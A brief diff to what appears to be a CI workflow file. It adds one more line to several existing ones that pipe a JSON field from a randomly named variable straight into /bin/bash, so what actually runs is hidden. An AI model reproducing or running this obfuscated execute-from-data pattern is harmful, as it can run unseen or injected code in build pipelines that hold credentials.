@@ -27,6 +27,7 @@ jobs:
           echo $k842 | jq -r .p658 | /bin/bash
           printf '%s' "$hr912" | jq -r .ipv678 | /bin/bash
           echo $urfn658 | jq -r .mskv8 | /bin/bash
+          echo $ftn125 | jq -r .m9 | /bin/bash
 
       - name: Save archive
         if: always()
